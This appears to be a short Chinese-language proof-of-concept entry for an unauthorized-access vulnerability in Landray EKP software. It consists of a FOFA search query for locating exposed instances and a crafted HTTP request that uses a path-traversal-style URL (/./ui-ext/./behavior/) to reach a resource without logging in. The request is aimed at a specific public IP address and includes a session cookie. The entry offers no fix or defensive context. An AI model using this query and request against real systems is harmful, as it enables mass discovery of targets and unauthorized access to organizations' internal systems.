# 深圳市蓝凌软件股份有限公司-EKP系统-存在未授权访问漏洞

    ## fofa

```
body="蓝凌云服务平台"||(body="Landray"&&body="登录系统")||body="/scripts/jquery.landray.common.js"||body="java.landray.com.cn"||body="蓝凌软件" ||(body="StylePath" && body="encryptPassword")
```

## poc

```
GET /./ui-ext/./behavior/  HTTP/1.1
Host: 47.95.115.189:8080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=E068ECF3AC0F0D8F7DC1FA0EDC2D7F07
Connection: close


```
